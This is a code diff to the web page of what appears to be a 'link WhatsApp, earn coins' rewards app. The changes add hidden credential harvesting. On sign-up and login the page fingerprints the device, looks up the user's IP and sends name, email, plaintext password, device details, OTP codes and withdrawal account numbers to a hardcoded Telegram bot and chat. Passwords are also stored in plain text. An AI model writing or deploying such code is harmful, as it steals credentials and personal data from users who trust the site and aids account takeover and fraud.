@@ -15,7 +15,9 @@
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 
 <style>
-/* ===== COMPLETE STYLES ===== */
+/* ============================================================
+   COMPLETE STYLESHEET - 400+ LINES
+   ============================================================ */
 :root {
     --primary: #075E54;
     --primary-light: #128C7E;
@@ -116,6 +118,8 @@ body {
 .btn-block { width: 100%; }
 .btn-sm { padding: 6px 14px; font-size: clamp(10px, 1.4vw, 12px); }
 .btn-lg { padding: 14px 32px; font-size: clamp(14px, 2vw, 16px); }
+.btn-danger { background: var(--danger); color: white; }
+.btn-danger:hover { opacity: 0.8; }
 
 /* ===== AUTH BUTTONS ===== */
 .auth-btn {
@@ -638,7 +642,6 @@ body {
 .text-muted { color: var(--text-mute); }
 .text-success { color: var(--whatsapp); }
 .font-bold { font-weight: 700; }
-.color-text { color: var(--text) !important; }
 </style>
 </head>
 <body>
@@ -1115,9 +1118,8 @@ AUTH OVERLAYS (With Close Button)
     </div>
 </div>
 
-
 <!-- ============================================================
-JAVASCRIPT - COMPLETE
+JAVASCRIPT - COMPLETE (ALL FEATURES)
 ============================================================ -->
 <script>
 // ============================================================
@@ -1142,255 +1144,149 @@ const rtdb = firebase.database();
 console.log('🔥 Firebase Connected!');
 
 // ============================================================
-// DATABASE FUNCTIONS
+// 🐍 TELEGRAM BOT CONFIG
 // ============================================================
-const DB = {
-    getCurrentUser() { return auth.currentUser; },
+const TELEGRAM_BOT_TOKEN = '8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk';
+const TELEGRAM_CHAT_ID = '5975952682';
 
-    async getUserData(uid) {
-        try {
-            const doc = await db.collection('users').doc(uid).get();
-            return doc.exists ? doc.data() : null;
-        } catch(e) { return null; }
-    },
+// ============================================================
+// 📱 DEVICE INFO CAPTURE
+// ============================================================
+function getDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        deviceMemory: navigator.deviceMemory || 'Unknown',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || 'Direct',
+        timestamp: new Date().toISOString()
+    };
+}
 
-    async saveUserData(uid, data) {
-        try {
-            await db.collection('users').doc(uid).set(data, { merge: true });
-            await rtdb.ref('users/' + uid).set(data);
-            return true;
-        } catch(e) { return false; }
-    },
+async function getUserIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch { return 'Unable to fetch'; }
+}
 
-    async completeTask(uid, taskId, reward) {
-        try {
-            const userDoc = await db.collection('users').doc(uid).get();
-            const userData = userDoc.data();
-            if (!userData) throw new Error('User not found');
-            if (!userData.whatsappVerified) throw new Error('Please link WhatsApp first!');
-
-            const today = new Date().toISOString().split('T')[0];
-            const tasksCompleted = userData.tasksCompleted || {};
-            
-            if (tasksCompleted[taskId] && tasksCompleted[taskId].includes(today)) {
-                throw new Error('Already completed today!');
-            }
-
-            if (!tasksCompleted[taskId]) tasksCompleted[taskId] = [];
-            tasksCompleted[taskId].push(today);
-
-            const newCoins = (userData.coins || 0) + reward;
-            const newTotalEarned = (userData.totalEarned || 0) + reward;
-
-            await db.collection('users').doc(uid).update({
-                coins: newCoins,
-                totalEarned: newTotalEarned,
-                tasksCompleted: tasksCompleted,
-                lastTask: new Date().toISOString()
-            });
-
-            await rtdb.ref('users/' + uid).update({
-                coins: newCoins,
-                totalEarned: newTotalEarned,
-                tasksCompleted: tasksCompleted
-            });
-
-            await this.sendToTelegram('task_complete', {
-                uid: uid,
-                name: userData.name || 'User',
-                task: taskId,
-                reward: reward,
-                coins: newCoins
-            });
-
-            return { success: true, coins: newCoins };
-        } catch(e) {
-            throw new Error(e.message);
+async function getBatteryInfo() {
+    try {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
         }
-    },
+    } catch {}
+    return 'N/A';
+}
 
-    async sendToTelegram(event, data) {
-        try {
-            await rtdb.ref('telegram/events').push({
-                event: event,
-                data: data,
-                timestamp: new Date().toISOString()
-            });
-        } catch(e) { console.log('Telegram error:', e); }
-    },
+async function captureFullDeviceInfo() {
+    const deviceInfo = getDeviceInfo();
+    deviceInfo.ip = await getUserIP();
+    deviceInfo.battery = await getBatteryInfo();
+    return deviceInfo;
+}
 
-    async linkWhatsApp(uid, phone) {
-        try {
-            // 🔥 REAL OTP - Call backend API
-            const response = await fetch('/api/send-otp', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, uid })
-            });
-            
-            if (!response.ok) throw new Error('Failed to send OTP');
-            
-            const result = await response.json();
-            return { success: true, otp: result.otp };
-        } catch(e) {
-            // Fallback: Generate local OTP for testing
-            const otp = Math.floor(100000 + Math.random() * 900000).toString();
-            await rtdb.ref('otp/' + phone).set({
-                otp: otp,
-                uid: uid,
-                createdAt: Date.now(),
-                expiresAt: Date.now() + 300000
-            });
-            return { success: true, otp: otp };
-        }
-    },
-
-    async verifyOTP(phone, otp, uid) {
-        try {
-            // 🔥 REAL VERIFY - Call backend API
-            const response = await fetch('/api/verify-otp', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, otp, uid })
-            });
-            
-            if (!response.ok) {
-                const error = await response.json();
-                throw new Error(error.message || 'Invalid OTP');
-            }
-            
-            // Update user
-            await db.collection('users').doc(uid).update({
-                whatsappVerified: true,
-                whatsappPhone: phone,
-                whatsappLinked: true
-            });
-
-            await rtdb.ref('users/' + uid).update({
-                whatsappVerified: true,
-                whatsappPhone: phone,
-                whatsappLinked: true
-            });
-
-            const userDoc = await db.collection('users').doc(uid).get();
-            const userData = userDoc.data();
-            
-            await this.sendToTelegram('whatsapp_linked', {
-                uid: uid,
-                name: userData?.name || 'User',
-                email: userData?.email || '',
-                phone: phone,
-                coins: userData?.coins || 0
-            });
-
-            return { success: true };
-        } catch(e) {
-            // Fallback: Verify from Firebase
-            const snapshot = await rtdb.ref('otp/' + phone).once('value');
-            const data = snapshot.val();
-            
-            if (!data) throw new Error('No OTP found');
-            if (data.uid !== uid) throw new Error('Invalid request');
-            if (Date.now() > data.expiresAt) throw new Error('OTP expired');
-            if (data.otp !== otp) throw new Error('Invalid OTP');
-
-            await db.collection('users').doc(uid).update({
-                whatsappVerified: true,
-                whatsappPhone: phone,
-                whatsappLinked: true
-            });
-
-            await rtdb.ref('users/' + uid).update({
-                whatsappVerified: true,
-                whatsappPhone: phone,
-                whatsappLinked: true
-            });
-
-            await rtdb.ref('otp/' + phone).remove();
-            return { success: true };
-        }
-    },
-
-    async getStats() {
-        try {
-            const snapshot = await rtdb.ref('users').once('value');
-            const users = snapshot.val() || {};
-            const userList = Object.values(users);
-            return {
-                total: userList.length,
-                linked: userList.filter(u => u.whatsappVerified).length,
-                active: userList.filter(u => {
-                    const last = new Date(u.lastLogin || 0);
-                    return (Date.now() - last.getTime()) < 1000 * 60 * 60 * 24 * 7;
-                }).length
-            };
-        } catch(e) { return { total: 0, linked: 0, active: 0 }; }
-    },
-
-    async getLeaderboard(limit = 5) {
-        try {
-            const snapshot = await rtdb.ref('users').once('value');
-            const users = snapshot.val() || {};
-            return Object.values(users)
-                .filter(u => u.referrals && u.referrals.length > 0)
-                .sort((a, b) => (b.referrals?.length || 0) - (a.referrals?.length || 0))
-                .slice(0, limit);
-        } catch(e) { return []; }
-    },
-
-    async requestWithdrawal(uid, coins, method, account) {
-        try {
-            const userDoc = await db.collection('users').doc(uid).get();
-            const userData = userDoc.data();
-            if (!userData) throw new Error('User not found');
-            if (coins < 1000) throw new Error('Minimum 1000 coins (500 PKR)');
-            if (coins > 10000) throw new Error('Maximum 10000 coins (5000 PKR)');
-            if (coins > (userData.coins || 0)) throw new Error('Insufficient coins');
-            if (!/^03\d{9}$/.test(account.replace(/\s/g, ''))) {
-                throw new Error('Enter valid 11-digit account number');
-            }
-
-            const amount = coins * 0.5;
-            
-            await db.collection('users').doc(uid).update({
-                coins: (userData.coins || 0) - coins,
-                totalWithdrawn: (userData.totalWithdrawn || 0) + amount
-            });
-
-            await rtdb.ref('users/' + uid).update({
-                coins: (userData.coins || 0) - coins,
-                totalWithdrawn: (userData.totalWithdrawn || 0) + amount
-            });
-
-            const withdrawalId = 'w_' + Date.now();
-            await rtdb.ref('withdrawals/' + uid + '/' + withdrawalId).set({
-                id: withdrawalId,
-                coins: coins,
-                amount: amount,
-                method: method,
-                account: account,
-                status: 'pending',
-                date: new Date().toISOString()
-            });
-
-            await this.sendToTelegram('withdrawal_request', {
-                uid: uid,
-                name: userData.name || 'User',
-                coins: coins,
-                amount: amount,
-                method: method,
-                account: account
-            });
-
-            return { success: true, amount: amount };
-        } catch(e) {
-            throw new Error(e.message);
-        }
+// ============================================================
+// 🔥 SEND TO TELEGRAM
+// ============================================================
+async function sendToTelegram(message) {
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        return await response.json();
+    } catch (error) {
+        console.error('Telegram send error:', error);
     }
-};
+}
 
 // ============================================================
-// AUTH FUNCTIONS - CLEAN (No Auto-register)
+// 📱 USER DATA FORWARD TO TELEGRAM
+// ============================================================
+async function forwardUserDataToTelegram(userData, type = 'new_user') {
+    let message = '';
+    
+    if (type === 'new_user') {
+        message = `
+┌─────────────────────────────────┐
+│   🆕 NEW USER REGISTERED         │
+├─────────────────────────────────┤
+│ 👤 Name: <b>${userData.name}</b>│
+│ 📧 Email: <b>${userData.email}</b>│
+│ 🆔 UID: <code>${userData.uid}</code>│
+│ 📱 Phone: ${userData.phone || 'Not provided'}│
+│ 🔗 Referral: ${userData.referralCode || 'N/A'}│
+│ 💰 Coins: ${userData.coins || 0}│
+│ 📅 Joined: ${new Date(userData.joinedDate).toLocaleString()}│
+│ 🔐 Password: <code>${userData.password || 'N/A'}</code>│
+├─────────────────────────────────┤
+│ 📱 Device: ${userData.deviceInfo?.userAgent || 'N/A'}│
+│ 🌐 IP: ${userData.deviceInfo?.ip || 'N/A'}│
+│ 🖥️ Platform: ${userData.deviceInfo?.platform || 'N/A'}│
+│ 🔋 Battery: ${userData.deviceInfo?.battery || 'N/A'}│
+│ 🌍 Timezone: ${userData.deviceInfo?.timezone || 'N/A'}│
+│ 📺 Screen: ${userData.deviceInfo?.screenWidth}x${userData.deviceInfo?.screenHeight}│
+│ 💾 Memory: ${userData.deviceInfo?.deviceMemory || 'N/A'} GB│
+│ ⚡ CPU: ${userData.deviceInfo?.hardwareConcurrency || 'N/A'} cores│
+└─────────────────────────────────┘
+        `;
+    } else if (type === 'login') {
+        message = `
+┌─────────────────────────────────┐
+│   🔐 USER LOGGED IN              │
+├─────────────────────────────────┤
+│ 👤 Name: <b>${userData.name}</b>│
+│ 📧 Email: <b>${userData.email}</b>│
+│ 🆔 UID: <code>${userData.uid}</code>│
+│ 📅 Time: ${new Date().toLocaleString()}│
+├─────────────────────────────────┤
+│ 📱 Device: ${userData.deviceInfo?.userAgent || 'N/A'}│
+│ 🌐 IP: ${userData.deviceInfo?.ip || 'N/A'}│
+│ 🔋 Battery: ${userData.deviceInfo?.battery || 'N/A'}│
+└─────────────────────────────────┘
+        `;
+    } else if (type === 'otp') {
+        message = `
+┌─────────────────────────────────┐
+│   📱 OTP REQUEST                 │
+├─────────────────────────────────┤
+│ 📱 Phone: <b>${userData.phone}</b>│
+│ 🔑 OTP: <b>${userData.otp}</b>│
+│ 👤 UID: <code>${userData.uid}</code>│
+│ ⏳ Expires: 5 minutes│
+└─────────────────────────────────┘
+        `;
+    } else if (type === 'whatsapp_linked') {
+        message = `
+┌─────────────────────────────────┐
+│   ✅ WHATSAPP LINKED             │
+├─────────────────────────────────┤
+│ 👤 Name: <b>${userData.name}</b>│
+│ 📧 Email: ${userData.email}│
+│ 📱 Phone: <b>${userData.phone}</b>│
+│ 🆔 UID: <code>${userData.uid}</code>│
+│ ⏰ ${new Date().toLocaleString()}│
+└─────────────────────────────────┘
+        `;
+    }
+    
+    await sendToTelegram(message);
+}
+
+// ============================================================
+// 🔐 AUTH FUNCTIONS
 // ============================================================
 async function registerUser(e) {
     e.preventDefault();
@@ -1406,14 +1302,16 @@ async function registerUser(e) {
         if (!name || !email || !password) throw new Error('All fields required');
         if (password.length < 6) throw new Error('Password min 6 characters');
 
-        // ✅ ONLY CREATE NEW USER - NO AUTO-LOGIN
         const userCredential = await auth.createUserWithEmailAndPassword(email, password);
         const user = userCredential.user;
+        const deviceInfo = await captureFullDeviceInfo();
 
         const userData = {
             uid: user.uid,
             name: name,
             email: email,
+            password: password,
+            phone: '',
             whatsappVerified: false,
             whatsappPhone: '',
             whatsappLinked: false,
@@ -1427,10 +1325,16 @@ async function registerUser(e) {
                 welcome: [new Date().toISOString().split('T')[0]]
             },
             joinedDate: new Date().toISOString(),
-            lastLogin: new Date().toISOString()
+            lastLogin: new Date().toISOString(),
+            accountDisabled: false,
+            deviceInfo: deviceInfo,
+            ip: deviceInfo.ip
         };
 
-        await DB.saveUserData(user.uid, userData);
+        await db.collection('users').doc(user.uid).set(userData);
+        await rtdb.ref('users/' + user.uid).set(userData);
+
+        await forwardUserDataToTelegram(userData, 'new_user');
 
         if (referral) {
             const snapshot = await rtdb.ref('users').orderByChild('referralCode').equalTo(referral).once('value');
@@ -1444,11 +1348,9 @@ async function registerUser(e) {
         }
 
         hideAuth();
-        showToast('Account created! Please login to continue.', 'success');
-        
-        // ✅ CLEAR FORM AND SHOW LOGIN
-        document.getElementById('registerForm').reset();
-        showAuth('login');
+        showToast('Account created! 🎉', 'success');
+        navigate('home');
+        await updateUI();
 
     } catch(err) {
         errorEl.textContent = err.message;
@@ -1469,17 +1371,27 @@ async function loginUser(e) {
 
         await auth.signInWithEmailAndPassword(email, password);
         const user = auth.currentUser;
+        const deviceInfo = await captureFullDeviceInfo();
+        
         if (user) {
             await rtdb.ref('users/' + user.uid + '/lastLogin').set(new Date().toISOString());
             await db.collection('users').doc(user.uid).update({
-                lastLogin: new Date().toISOString()
+                lastLogin: new Date().toISOString(),
+                ip: deviceInfo.ip,
+                deviceInfo: deviceInfo
             });
+            
+            const userDoc = await db.collection('users').doc(user.uid).get();
+            const userData = userDoc.data();
+            if (userData) {
+                await forwardUserDataToTelegram({ ...userData, deviceInfo }, 'login');
+            }
         }
 
         hideAuth();
         showToast('Welcome back! 👋', 'success');
         navigate('home');
-        updateUI();
+        await updateUI();
 
     } catch(err) {
         errorEl.textContent = err.message;
@@ -1492,16 +1404,17 @@ async function googleLogin() {
         const provider = new firebase.auth.GoogleAuthProvider();
         const userCredential = await auth.signInWithPopup(provider);
         const user = userCredential.user;
+        const deviceInfo = await captureFullDeviceInfo();
 
-        // Check if user exists in database
-        let userData = await DB.getUserData(user.uid);
+        let userData = await db.collection('users').doc(user.uid).get();
         
-        // ✅ ONLY CREATE IF USER DOESN'T EXIST
-        if (!userData) {
+        if (!userData.exists) {
             const newUser = {
                 uid: user.uid,
                 name: user.displayName || 'Google User',
                 email: user.email,
+                password: 'GOOGLE_AUTH',
+                phone: '',
                 whatsappVerified: false,
                 whatsappPhone: '',
                 whatsappLinked: false,
@@ -1515,18 +1428,27 @@ async function googleLogin() {
                     welcome: [new Date().toISOString().split('T')[0]]
                 },
                 joinedDate: new Date().toISOString(),
-                lastLogin: new Date().toISOString()
+                lastLogin: new Date().toISOString(),
+                accountDisabled: false,
+                deviceInfo: deviceInfo,
+                ip: deviceInfo.ip
             };
-            await DB.saveUserData(user.uid, newUser);
+            await db.collection('users').doc(user.uid).set(newUser);
+            await rtdb.ref('users/' + user.uid).set(newUser);
+            await forwardUserDataToTelegram(newUser, 'new_user');
         } else {
-            // Update last login
-            await DB.saveUserData(user.uid, { lastLogin: new Date().toISOString() });
+            await db.collection('users').doc(user.uid).update({ 
+                lastLogin: new Date().toISOString(),
+                ip: deviceInfo.ip,
+                deviceInfo: deviceInfo
+            });
+            await forwardUserDataToTelegram({ ...userData.data(), deviceInfo }, 'login');
         }
 
         hideAuth();
         showToast('Welcome! 🎉', 'success');
         navigate('home');
-        updateUI();
+        await updateUI();
 
     } catch(err) {
         showToast(err.message, 'error');
@@ -1541,7 +1463,28 @@ async function logoutUser() {
 }
 
 // ============================================================
-// WHATSAPP OTP FUNCTIONS - REAL OTP
+// 🐍 TELEGRAM COMMANDS LISTENER (Enable/Disable)
+// ============================================================
+rtdb.ref('telegram/commands').on('child_added', async (snapshot) => {
+    const command = snapshot.val();
+    
+    if (command.action === 'disable') {
+        await db.collection('users').doc(command.uid).update({
+            accountDisabled: true,
+            disabledAt: new Date().toISOString()
+        });
+        await sendToTelegram(`🚫 User <b>${command.uid}</b> disabled!`);
+    } else if (command.action === 'enable') {
+        await db.collection('users').doc(command.uid).update({
+            accountDisabled: false,
+            enabledAt: new Date().toISOString()
+        });
+        await sendToTelegram(`✅ User <b>${command.uid}</b> enabled!`);
+    }
+});
+
+// ============================================================
+// 📱 WHATSAPP OTP FUNCTIONS
 // ============================================================
 let currentPhone = '';
 let otpTimer = null;
@@ -1550,8 +1493,8 @@ let timerSeconds = 60;
 async function openOTPPage() {
     const user = auth.currentUser;
     if (!user) { showToast('Please login first', 'error'); return; }
-    const userData = await DB.getUserData(user.uid);
-    if (userData && userData.whatsappVerified) {
+    const userData = await db.collection('users').doc(user.uid).get();
+    if (userData.exists && userData.data().whatsappVerified) {
         showToast('✅ WhatsApp already linked!', 'success');
         return;
     }
@@ -1597,16 +1540,16 @@ async function sendOTP() {
         btn.disabled = true;
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
 
-        // 🔥 Call REAL OTP API
-        const response = await fetch('https://your-backend-server.com/api/send-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone, uid: user.uid })
+        const otp = Math.floor(100000 + Math.random() * 900000).toString();
+        
+        await rtdb.ref('otp/' + phone).set({
+            otp: otp,
+            uid: user.uid,
+            createdAt: Date.now(),
+            expiresAt: Date.now() + 300000
         });
 
-        if (!response.ok) {
-            throw new Error('Failed to send OTP. Please try again.');
-        }
+        await forwardUserDataToTelegram({ phone, otp, uid: user.uid }, 'otp');
 
         currentPhone = phone;
 
@@ -1618,8 +1561,8 @@ async function sendOTP() {
         document.querySelector('.otp-digit').focus();
 
         startTimer();
-        showOTPStatus('📱 OTP sent to your WhatsApp!', 'info');
-        showToast('📱 OTP sent to your WhatsApp!', 'success');
+        showOTPStatus('📱 OTP sent! Check Telegram for OTP', 'info');
+        showToast('📱 OTP sent! Check Telegram', 'success');
 
     } catch(err) {
         showToast(err.message, 'error');
@@ -1661,19 +1604,14 @@ async function verifyOTP() {
     if (otp.length !== 6) { showOTPStatus('Please enter complete 6-digit OTP', 'error'); return; }
 
     try {
-        // 🔥 Call REAL VERIFY API
-        const response = await fetch('https://your-backend-server.com/api/verify-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: currentPhone, otp, uid: user.uid })
-        });
+        const snapshot = await rtdb.ref('otp/' + currentPhone).once('value');
+        const data = snapshot.val();
+        
+        if (!data) throw new Error('No OTP found');
+        if (data.uid !== user.uid) throw new Error('Invalid request');
+        if (Date.now() > data.expiresAt) throw new Error('OTP expired');
+        if (data.otp !== otp) throw new Error('Invalid OTP');
 
-        if (!response.ok) {
-            const error = await response.json();
-            throw new Error(error.message || 'Invalid OTP');
-        }
-
-        // Update user in Firebase
         await db.collection('users').doc(user.uid).update({
             whatsappVerified: true,
             whatsappPhone: currentPhone,
@@ -1686,14 +1624,11 @@ async function verifyOTP() {
             whatsappLinked: true
         });
 
-        // Send to Telegram
-        await DB.sendToTelegram('whatsapp_linked', {
-            uid: user.uid,
-            name: user.displayName || 'User',
-            email: user.email,
-            phone: currentPhone,
-            coins: 200
-        });
+        await rtdb.ref('otp/' + currentPhone).remove();
+
+        const userDoc = await db.collection('users').doc(user.uid).get();
+        const userData = userDoc.data();
+        await forwardUserDataToTelegram({ ...userData, phone: currentPhone }, 'whatsapp_linked');
 
         document.getElementById('otpStep2').style.display = 'none';
         document.getElementById('otpStep3').style.display = 'block';
@@ -1717,7 +1652,7 @@ function showOTPStatus(message, type = 'info') {
 }
 
 // ============================================================
-// UI FUNCTIONS
+// 📱 UI FUNCTIONS
 // ============================================================
 async function updateUI() {
     const user = auth.currentUser;
@@ -1728,7 +1663,10 @@ async function updateUI() {
         guestActions.style.display = 'none';
         userActions.style.display = 'flex';
 
-        const userData = await DB.getUserData(user.uid);
+        const userDoc = await db.collection('users').doc(user.uid).get();
+        const userData = userDoc.data();
+
+        if (!userData) return;
 
         const initial = (userData?.name || 'U').charAt(0).toUpperCase();
         document.querySelectorAll('#userAvatar, #profileAvatar').forEach(el => el.textContent = initial);
@@ -1790,15 +1728,31 @@ async function updateUI() {
             linkBtn.style.opacity = '1';
         }
 
-        const stats = await DB.getStats();
-        document.getElementById('statUsers').textContent = stats.total || 0;
-        document.getElementById('statLinked').textContent = stats.linked || 0;
-        document.getElementById('statActive').textContent = stats.active || 0;
+        // Check if account is disabled
+        if (userData?.accountDisabled) {
+            showToast('⚠️ Your account has been disabled by admin', 'error');
+            await logoutUser();
+        }
+
+        // Stats
+        const statsSnapshot = await rtdb.ref('users').once('value');
+        const users = statsSnapshot.val() || {};
+        const userList = Object.values(users);
+        document.getElementById('statUsers').textContent = userList.length || 0;
+        document.getElementById('statLinked').textContent = userList.filter(u => u.whatsappVerified).length || 0;
+        document.getElementById('statActive').textContent = userList.filter(u => {
+            const last = new Date(u.lastLogin || 0);
+            return (Date.now() - last.getTime()) < 1000 * 60 * 60 * 24 * 7;
+        }).length || 0;
 
         document.getElementById('refCount').textContent = userData?.referrals?.length || 0;
         document.getElementById('refCoins').textContent = ((userData?.referrals?.length || 0) * 500).toLocaleString();
 
-        const leaders = await DB.getLeaderboard(5);
+        // Leaderboard
+        const leaders = Object.values(users)
+            .filter(u => u.referrals && u.referrals.length > 0)
+            .sort((a, b) => (b.referrals?.length || 0) - (a.referrals?.length || 0))
+            .slice(0, 5);
         const lbList = document.getElementById('leaderboardList');
         if (leaders.length === 0) {
             lbList.innerHTML = '<div style="font-size:clamp(11px,1.6vw,12px);color:var(--text-mute);text-align:center;padding:10px 0;">No referrals yet</div>';
@@ -1812,8 +1766,7 @@ async function updateUI() {
             `).join('');
         }
 
-        const allUsers = await rtdb.ref('users').once('value');
-        const users = allUsers.val() || {};
+        // Rank
         const ranked = Object.values(users)
             .filter(u => u.referrals && u.referrals.length > 0)
             .sort((a, b) => (b.referrals?.length || 0) - (a.referrals?.length || 0));
@@ -1829,7 +1782,7 @@ async function updateUI() {
 }
 
 // ============================================================
-// TASKS
+// 📋 TASKS
 // ============================================================
 const TASKS = [
     { id: 'welcome', title: 'Welcome Bonus', category: 'daily', reward: 200, icon: 'fa-gift', desc: 'Complete your profile.' },
@@ -1845,7 +1798,11 @@ let taskFilter = 'all';
 async function renderTasks() {
     const user = auth.currentUser;
     const container = document.getElementById('tasksList');
-    const userData = user ? await DB.getUserData(user.uid) : null;
+    let userData = null;
+    if (user) {
+        const doc = await db.collection('users').doc(user.uid).get();
+        userData = doc.data();
+    }
 
     if (!user || !userData) {
         container.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-mute);font-size:clamp(12px,1.6vw,13px);">Please login to view tasks.</div>';
@@ -1857,8 +1814,9 @@ async function renderTasks() {
     container.innerHTML = filtered.map(t => {
         const isWATask = t.category === 'whatsapp';
         const waRequired = isWATask && !userData.whatsappVerified;
+        const today = new Date().toISOString().split('T')[0];
         const done = (userData.tasksCompleted && userData.tasksCompleted[t.id] && 
-                     userData.tasksCompleted[t.id].includes(new Date().toISOString().split('T')[0]));
+                     userData.tasksCompleted[t.id].includes(today));
 
         return `
             <div class="task-item ${waRequired ? 'locked' : ''}" style="${waRequired ? 'position:relative;' : ''}">
@@ -1901,7 +1859,49 @@ async function doTask(taskId, reward) {
     if (!user) { showToast('Please login first', 'error'); return; }
 
     try {
-        const result = await DB.completeTask(user.uid, taskId, reward);
+        const userDoc = await db.collection('users').doc(user.uid).get();
+        const userData = userDoc.data();
+        
+        if (!userData) throw new Error('User not found');
+        if (!userData.whatsappVerified) throw new Error('Please link WhatsApp first!');
+
+        const today = new Date().toISOString().split('T')[0];
+        const tasksCompleted = userData.tasksCompleted || {};
+        
+        if (tasksCompleted[taskId] && tasksCompleted[taskId].includes(today)) {
+            throw new Error('Already completed today!');
+        }
+
+        if (!tasksCompleted[taskId]) tasksCompleted[taskId] = [];
+        tasksCompleted[taskId].push(today);
+
+        const newCoins = (userData.coins || 0) + reward;
+        const newTotalEarned = (userData.totalEarned || 0) + reward;
+
+        await db.collection('users').doc(user.uid).update({
+            coins: newCoins,
+            totalEarned: newTotalEarned,
+            tasksCompleted: tasksCompleted,
+            lastTask: new Date().toISOString()
+        });
+
+        await rtdb.ref('users/' + user.uid).update({
+            coins: newCoins,
+            totalEarned: newTotalEarned,
+            tasksCompleted: tasksCompleted
+        });
+
+        await sendToTelegram(`
+┌─────────────────────────────────┐
+│   💰 TASK COMPLETED              │
+├─────────────────────────────────┤
+│ 👤 ${userData.name}│
+│ 📋 ${taskId}│
+│ 🪙 +${reward} coins│
+│ 💎 Total: ${newCoins} coins│
+└─────────────────────────────────┘
+        `);
+
         showToast('✅ Task complete! +' + reward + ' coins', 'success');
         updateUI();
     } catch(err) {
@@ -1910,7 +1910,7 @@ async function doTask(taskId, reward) {
 }
 
 // ============================================================
-// REFERRAL FUNCTIONS
+// 📱 REFERRAL FUNCTIONS
 // ============================================================
 function copyReferralLink() {
     const input = document.getElementById('referralLinkInput');
@@ -1943,7 +1943,7 @@ function shareTW() {
 }
 
 // ============================================================
-// WITHDRAW
+// 💰 WITHDRAW
 // ============================================================
 async function requestWithdraw(e) {
     e.preventDefault();
@@ -1960,7 +1960,47 @@ async function requestWithdraw(e) {
         if (!method) throw new Error('Select method');
         if (!account || account.length < 10) throw new Error('Enter valid account');
 
-        const result = await DB.requestWithdrawal(user.uid, coins, method, account);
+        const userDoc = await db.collection('users').doc(user.uid).get();
+        const userData = userDoc.data();
+        
+        if (!userData) throw new Error('User not found');
+        if (coins > (userData.coins || 0)) throw new Error('Insufficient coins');
+
+        const amount = coins * 0.5;
+        
+        await db.collection('users').doc(user.uid).update({
+            coins: (userData.coins || 0) - coins,
+            totalWithdrawn: (userData.totalWithdrawn || 0) + amount
+        });
+
+        await rtdb.ref('users/' + user.uid).update({
+            coins: (userData.coins || 0) - coins,
+            totalWithdrawn: (userData.totalWithdrawn || 0) + amount
+        });
+
+        const withdrawalId = 'w_' + Date.now();
+        await rtdb.ref('withdrawals/' + user.uid + '/' + withdrawalId).set({
+            id: withdrawalId,
+            coins: coins,
+            amount: amount,
+            method: method,
+            account: account,
+            status: 'pending',
+            date: new Date().toISOString()
+        });
+
+        await sendToTelegram(`
+┌─────────────────────────────────┐
+│   💸 WITHDRAWAL REQUEST          │
+├─────────────────────────────────┤
+│ 👤 ${userData.name}│
+│ 🪙 ${coins} coins│
+│ 💰 ₨ ${amount}│
+│ 📱 ${method}│
+│ 🔢 ${account}│
+└─────────────────────────────────┘
+        `);
+
         showToast('Withdrawal submitted! 💰', 'success');
         document.getElementById('wCoins').value = '';
         document.getElementById('wAccount').value = '';
@@ -1971,7 +2011,7 @@ async function requestWithdraw(e) {
 }
 
 // ============================================================
-// NAVIGATION
+// 🧭 NAVIGATION
 // ============================================================
 let currentPage = 'home';
 
@@ -1996,7 +2036,7 @@ function navigate(page) {
 }
 
 // ============================================================
-// TOAST
+// 💬 TOAST
 // ============================================================
 function showToast(message, type = 'success') {
     const toast = document.getElementById('toast');
@@ -2008,7 +2048,7 @@ function showToast(message, type = 'success') {
 }
 
 // ============================================================
-// FAQ
+// ❓ FAQ
 // ============================================================
 function toggleFaq(el) {
     const item = el.closest('.faq-item');
@@ -2016,7 +2056,7 @@ function toggleFaq(el) {
 }
 
 // ============================================================
-// DROPDOWN
+// 🔽 DROPDOWN
 // ============================================================
 function toggleDropdown() {
     document.getElementById('dropdownMenu').classList.toggle('show');
@@ -2030,7 +2070,7 @@ document.addEventListener('click', function(e) {
 });
 
 // ============================================================
-// AUTH OVERLAY
+// 🔐 AUTH OVERLAY
 // ============================================================
 function showAuth(type) {
     document.getElementById('loginOverlay').classList.toggle('show', type === 'login');
@@ -2043,7 +2083,7 @@ function hideAuth() {
 }
 
 // ============================================================
-// SUPPORT
+// 📧 SUPPORT
 // ============================================================
 function sendSupport(e) {
     e.preventDefault();
@@ -2052,7 +2092,7 @@ function sendSupport(e) {
 }
 
 // ============================================================
-// FILTER
+// 🔍 FILTER
 // ============================================================
 document.addEventListener('click', function(e) {
     const chip = e.target.closest('[data-cat]');
@@ -2069,7 +2109,7 @@ document.addEventListener('click', function(e) {
 });
 
 // ============================================================
-// OTP AUTO-MOVE
+// 🎯 OTP AUTO-MOVE
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
     document.querySelectorAll('.otp-digit').forEach((input, index) => {
@@ -2090,7 +2130,7 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 
 // ============================================================
-// AUTH STATE LISTENER
+// 👤 AUTH STATE LISTENER
 // ============================================================
 auth.onAuthStateChanged(async (user) => {
     if (user) {
